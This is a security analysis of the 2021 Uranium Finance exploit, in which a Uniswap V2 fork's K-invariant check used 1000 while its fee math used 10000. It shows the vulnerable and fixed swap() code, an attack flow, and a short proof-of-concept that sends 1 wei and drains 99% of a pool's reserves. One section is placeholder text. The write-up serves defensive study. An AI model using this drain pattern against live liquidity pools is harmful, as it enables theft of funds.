# Uranium Finance — K Invariant Constant Mismatch Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2021-04-28 |
| **Protocol** | Uranium Finance |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$50,000,000 |
| **Attacker** | Address unidentified |
| **Attack Tx** | Address unidentified |
| **Vulnerable Contract** | Uranium AMM Pair (WBNB/BUSD, etc.) |
| **Root Cause** | Bug where the constant used in the K invariant check after `swap()` (1000) differs from the fee calculation constant (10000), causing K to effectively increase by 100x |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-04/Uranium_exp.sol) |

---
## 1. Vulnerability Overview

Uranium Finance is a Uniswap V2 fork that introduced the constant `10000` when modifying its fee structure. However, the K invariant check at the end of the `swap()` function retained the original Uniswap value of `1000`. As a result, the invariant check would pass even when the K value effectively increased by 100x after a swap, allowing an attacker to withdraw over 99% of assets from a liquidity pool by depositing only a negligible amount.

---
## 2. Vulnerable Code Analysis

### 2.1 swap() — K Invariant Constant Mismatch

```solidity
// ❌ Uranium Pair Contract
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    // Fee calculation: uses 10000 (Uranium modification)
    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));
    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));

    // K invariant check: uses 1000 (unchanged from Uniswap original)
    // balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * (1000**2)
    // Should be (10000**2) = 100,000,000, but
    // checks against (1000**2) = 1,000,000 → passes at a K threshold 100x too low
    require(
        balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2),
        'Uranium: K'
    );
}
```

**Fixed code**:
```solidity
// ✅ Fee calculation constant and K invariant constant aligned
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));
    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));

    // Correctly validates against 10000**2 = 100,000,000
    require(
        balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2),
        'Uranium: K'
    );
}
```


### On-Chain Source Code

Source: Unverified

> ⚠️ No on-chain source code — bytecode only or source unverified

**Vulnerable function** — `vulnerableFunction()`:
```solidity
// ❌ Root cause: Bug where the constant used in the K invariant check after swap() (1000) differs from the fee calculation constant (10000), causing K to increase by 100x
// Source code unverified — bytecode analysis required
// Vulnerability: Bug where the constant used in the K invariant check after swap() (1000) differs from the fee calculation constant (10000), causing K to increase by 100x
```

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│ Step 1: Transfer a small amount of tokens to Uranium    │
│         Pair                                            │
│ WBNB.transfer(pair, 1 wei)                              │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 2: pair.swap(amount0Out≈99%, 0, attacker, "")      │
│ amount0Out = reserve0 * 99 / 100                        │
│ K check: (balance0_adj * balance1_adj) >= K * 1000^2   │
│ Actual K is 100x higher → always passes                 │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 3: Drain most of WBNB + BUSD from the pool         │
│ ~$50M worth of assets withdrawn                         │
└─────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// takeFunds() core logic — exploiting the K invariant bug
function takeFunds(address pair, address token0, address token1) internal {
    uint reserve0;
    uint reserve1;
    (reserve0, reserve1,) = IUniswapV2Pair(pair).getReserves();

    // Transfer a small amount of tokens to the pool (to satisfy K)
    IERC20(token0).transfer(pair, 1);

    // Request 99% of reserves as amountOut
    // K = (reserve0*10000 - 1*16) * (reserve1*10000)
    //   >= reserve0 * reserve1 * 1000^2  ← passes with 100x headroom
    IUniswapV2Pair(pair).swap(
        reserve0 * 99 / 100,  // drain 99%
        0,
        address(this),
        ""
    );
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Mismatch between fee constant (10000) and K invariant constant (1000) — K check nullified | CRITICAL | CWE-682 |
| V-02 | No invariant consistency review after modifying forked code | HIGH | CWE-20 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Use named constants to prevent mismatches
uint public constant FEE_DENOMINATOR = 10000;
uint public constant FEE_NUMERATOR = 16; // 0.16% fee

function swap(...) external {
    uint balance0Adjusted = balance0.mul(FEE_DENOMINATOR).sub(amount0In.mul(FEE_NUMERATOR));
    uint balance1Adjusted = balance1.mul(FEE_DENOMINATOR).sub(amount1In.mul(FEE_NUMERATOR));

    // Use the same constant
    require(
        balance0Adjusted.mul(balance1Adjusted) >=
            uint(_reserve0).mul(_reserve1).mul(FEE_DENOMINATOR**2),
        'Uranium: K'
    );
}
// ✅ Unit tests for all modified constants are mandatory when forking
```

---
## 7. Lessons Learned

- **When forking a protocol, changing a single constant can break an entire mathematical invariant.** Modifying the fee constant requires updating the K invariant formula accordingly.
- **A $50M loss stemmed from a single digit difference in one line of code (1000 → 10000).** Mathematical invariant checks must be treated as a separate line item during code review.
- **Using named constants can prevent this type of mistake.** When the same numeric value appears in two separate locations with the same semantic meaning, it must be extracted into a single shared constant.